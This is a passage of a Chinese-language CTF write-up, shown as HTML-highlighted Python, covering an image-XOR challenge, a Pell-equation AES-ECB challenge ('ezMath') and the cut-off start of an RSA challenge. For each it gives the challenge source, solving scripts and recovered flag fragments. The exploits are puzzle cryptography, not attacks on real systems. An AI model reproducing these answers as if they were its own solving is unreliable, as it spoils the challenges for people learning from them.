ImageDraw<span class=\"token punctuation\">.</span>Draw<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    draw<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span>font<span class=\"token punctuation\">,</span> fill<span class=\"token operator\">=</span>text_color<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span> image</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">xor_images</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">,</span> image2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span> image1<span class=\"token punctuation\">.</span>size <span class=\"token operator\">!=</span> image2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"Images must have the same dimensions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    xor_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    pixels1 <span class=\"token operator\">=</span> image1<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    pixels2 <span class=\"token operator\">=</span> image2<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    xor_pixels <span class=\"token operator\">=</span> xor_image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            r1<span class=\"token punctuation\">,</span> g1<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">=</span> pixels1<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            r2<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">,</span> b2 <span class=\"token operator\">=</span> pixels2<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            xor_pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r1 <span class=\"token operator\">^</span> r2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">^</span> g2<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">^</span> b2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">return</span> xor_image</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_unique_strings</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    unique_strings <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>unique_strings<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        random_string <span class=\"token operator\">=</span> secrets<span class=\"token punctuation\">.</span>token_hex<span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        unique_strings<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>random_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>unique_strings<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>random_strings <span class=\"token operator\">=</span> generate_unique_strings<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random_strings<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>current_image <span class=\"token operator\">=</span> generate_random_image<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>current_image<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>key_image <span class=\"token operator\">=</span> generate_random_image<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>key_image<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">random_time</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\".\\\\png_out\\\\&#123;&#125;.png\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    current_image <span class=\"token operator\">=</span> draw_text<span class=\"token punctuation\">(</span>current_image<span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>random_time<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>xor_images<span class=\"token punctuation\">(</span>current_image<span class=\"token punctuation\">,</span> key_image<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random_strings<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>大致思路应该让我们找到 key_image，去异或 draw_text () 覆盖上 current_image 的字母，但是我转念一想，如果找到如果找到了 key_image，但是图片的顺序是用 random_strings () 名称来打乱了，那么不确定顺序 flag 一样无法解决，所以我们找到第一张和第二张与 key_image 的图片即可，然后判断字母数量即可确定顺序。</p>\n<p>解题脚本不太优雅，还是等下 exp 学习一下捏</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image<span class=\"token punctuation\">,</span> ImageDraw<span class=\"token punctuation\">,</span> ImageFont</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> secrets</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>png1 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'4.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>png2 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'14.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#与 key_image 的 xor 顺序</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 4 7 20 15 21 9 12 19 13 16 2 10 18 5 17 8 3 6 1 11 14</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">xor_images</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">,</span> image2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> image1<span class=\"token punctuation\">.</span>size <span class=\"token operator\">!=</span> image2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"Images must have the same dimensions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    xor_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    pixels1 <span class=\"token operator\">=</span> image1<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    pixels2 <span class=\"token operator\">=</span> image2<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    xor_pixels <span class=\"token operator\">=</span> xor_image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            r1<span class=\"token punctuation\">,</span> g1<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">=</span> pixels1<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            r2<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">,</span> b2 <span class=\"token operator\">=</span> pixels2<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            xor_pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r1 <span class=\"token operator\">^</span> r2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">^</span> g2<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">^</span> b2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">return</span> xor_image</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>a <span class=\"token operator\">=</span> xor_images<span class=\"token punctuation\">(</span>png1<span class=\"token punctuation\">,</span> png2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>a<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 1adf\\_17eb\\_803c\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezmath100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezmath100pt\">#</a> ezMath(100pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的数学题</p>\n</blockquote>\n<p>pell 方程，需要求出 y，以 y 为 key，解决 aes 的 ebc 问题</p>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> random<span class=\"token punctuation\">,</span>string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cipher<span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    encrypted <span class=\"token operator\">=</span>cipher<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> encrypted</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>D <span class=\"token operator\">=</span> <span class=\"token number\">114514</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">assert</span> x<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> D <span class=\"token operator\">*</span> y<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>key<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>enc<span class=\"token operator\">=</span>encrypt<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#enc=b\"\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5'\\x93\\xf8\\xde\\xb2\\x9a\\x9a\"</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> random<span class=\"token punctuation\">,</span>string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cipher<span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    encrypted <span class=\"token operator\">=</span>cipher<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> encrypted</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>encrypted_message<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    cipher <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    decrypted <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>encrypted_message<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    unpadded <span class=\"token operator\">=</span> decrypted<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> unpadded</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solve_pell</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span> numTry <span class=\"token operator\">=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    cf <span class=\"token operator\">=</span> continued_fraction<span class=\"token punctuation\">(</span>sqrt<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>numTry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        denom <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>denominator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        numer <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>numerator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> numer<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> N <span class=\"token operator\">*</span> denom<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">return</span> numer<span class=\"token punctuation\">,</span> denom</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token number\">114514</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>pell <span class=\"token operator\">=</span> solve_pell<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#(3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199, 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#--------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;test&#125;'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>key<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5'\\x93\\xf8\\xde\\xb2\\x9a\\x9a\"</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote G0od!\\_Yo3\\_k1ow\\_C0ntinued\\_Fra3ti0ns!!!!!!!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezrsa50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa50pt\">#</a> ezRSA(50pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的 RSA</p>\n</blockquote>\n<p>有 leak1 与 leak2，需要推到出 p q</p>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span 